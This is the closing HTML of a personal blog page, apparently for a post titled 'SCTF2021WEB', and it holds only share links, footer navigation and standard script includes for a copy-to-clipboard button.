  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2021/12/26/2021122621/&text=SCTF2021WEB"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2021/12/26/2021122621/&is_video=false&description=SCTF2021WEB"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SCTF2021WEB&body=Check out this article: https://tefuir72.github.io/2021/12/26/2021122621/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2021/12/26/2021122621/&name=SCTF2021WEB&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2021/12/26/2021122621/&t=SCTF2021WEB"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2022
    Te Fuir
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->
 
  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

   
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
